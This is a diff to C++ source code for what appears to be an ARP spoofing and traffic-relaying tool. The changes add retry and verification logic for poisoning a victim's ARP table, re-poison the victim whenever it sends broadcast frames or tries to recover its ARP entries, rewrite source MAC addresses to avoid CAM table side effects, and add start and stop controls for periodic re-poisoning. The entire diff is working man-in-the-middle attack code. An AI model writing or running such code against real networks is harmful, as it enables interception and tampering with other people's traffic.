@@ -1,6 +1,17 @@
 #include "pch.h"
 #include "net/netflow.h"
 #include "pstl/waithandle.h"
+#include "service/runopt.h"
+
+
+NetworkFlow::NetworkFlow(NetworkObject& sender, NetworkObject& target) :
+		_sender(sender),
+		_target(target),
+		_timeout(RunOption::Global().Timeout.Get()),
+		_token(true),
+		_run(false)
+{
+}
 
 bool NetworkFlow::InitializeComponents()
 {
@@ -35,22 +46,49 @@ std::future<bool> NetworkFlow::Run()
 		int attempt = 0;
 		do
 		{
-			LOG(INFO) << "attempt to spoof ARP table of "
-					  << static_cast<std::string_view>(_sender.IP.Get())
-					  << " [" << attempt << "/5]";
-			_sender.InfectAsync(_target.IP.Get()).wait();
-			LOG(VERB) << "testing whether ARP modified";
-			affect = _sender.InfectionTestAsync(targetIP, _timeout).get();
-			if (affect)
+			if (RunOption::Global().CheckICMP.Get())
 			{
-				LOG(NOTE) << "ARP table for "
+				LOG(INFO) << "attempt to spoof ARP table of "
 						  << static_cast<std::string_view>(_sender.IP.Get())
-						  << "has been infected";
+						  << " [" << attempt << "/5]";
+				affect = _sender.InfectAsync(_target.IP.Get()).get();
+				if (affect)
+				{
+					LOG(VERB) << "testing whether ARP modified";
+					affect = _sender.InfectionTestAsync(targetIP, _timeout).get();
+				}
+				else
+				{
+					LOG(FAIL) << "could not infect "
+							  << static_cast<std::string_view>(_sender.IP.Get());
+				}
+
+				if (affect)
+				{
+					LOG(NOTE) << "ARP table for "
+							  << static_cast<std::string_view>(_sender.IP.Get())
+							  << "has been infected";
+				}
+				else
+				{
+					LOG(WARN) << "failed to attempt spoof ARP table of "
+							  << static_cast<std::string_view>(_sender.IP.Get());
+				}
 			}
 			else
 			{
-				LOG(WARN) << "failed to attempt spoof ARP table of "
+				LOG(INFO) << "attempt to spoof ARP table of "
 						  << static_cast<std::string_view>(_sender.IP.Get());
+				affect = _sender.InfectAsync(_target.IP.Get()).get();
+				if (affect)
+				{
+					LOG(INFO) << "ARP infection packet sent";
+				}
+				else
+				{
+					LOG(FAIL) << "could not infect "
+							  << static_cast<std::string_view>(_sender.IP.Get());
+				}
 			}
 		} while (!affect && attempt++ < 5);
 
@@ -86,18 +124,24 @@ std::future<bool> NetworkFlow::Relay()
 			OctetStream data;
 			data += origin;
 
+			/*
+			 * do NOT keep source MAC address
+			 * keeping source MAC address may cause unintended CAM table modification
+			 * */
 			auto rawMAC = selfMAC.value().Raw.Get();
 			_rt_memcpy(data.As<DTO(MAC)>(sizeof(DTO(MAC))), &rawMAC, sizeof(DTO(MAC)));
 
 			_target.Send(std::move(data));
 
 			/*
+			 * Target --)        : Blabla
 			 * Target --)        : Who has this IP?
 			 * Target --> Sender : Do you have this IP/MAC?
 			 * */
-			if (hdr.GetType() == HeaderSet::SpecialType::ARP &&
-				(hdr.GetARP().TargetIP.Get() == _target.IP.Get() ||
-				 hdr.GetARP().TargetMAC.Get() == _target.MAC.Get()))
+			if ((hdr.GetType() == HeaderSet::SpecialType::ARP &&
+				 (hdr.GetARP().TargetIP.Get() == _target.IP.Get() ||
+				  hdr.GetARP().TargetMAC.Get() == _target.MAC.Get())) ||
+				hdr.GetEthernetHeader().Destination.Get() == MAC::Broadcast)
 			{
 				/* Sender attempt to recover ARP table => re-infect */
 				_sender.InfectAsync(_target.IP.Get());
@@ -113,10 +157,12 @@ std::future<bool> NetworkFlow::Periodic(std::chrono::milliseconds period)
 {
 	return std::async(std::launch::async, [this, period]()
 	{
+		_run = true;
+
 		_sender.InfectAsync(_target.IP.Get()).wait();
 
 		auto stp = std::chrono::system_clock::now();
-		for (;;)
+		for (; _token;)
 		{
 			auto etp = std::chrono::system_clock::now();
 			if (std::chrono::duration_cast<std::chrono::milliseconds>(etp - stp) > period)
@@ -124,6 +170,21 @@ std::future<bool> NetworkFlow::Periodic(std::chrono::milliseconds period)
 			sched_yield();
 		}
 
+		_run = false;
+
 		return true;
 	});
+}
+
+std::future_status NetworkFlow::Join(std::chrono::milliseconds timeout)
+{
+	return std::async(std::launch::async, [this]()
+	{
+		for (; _run;) sched_yield();
+	}).wait_for(timeout);
+}
+
+void NetworkFlow::Stop()
+{
+	_token = false;
 }
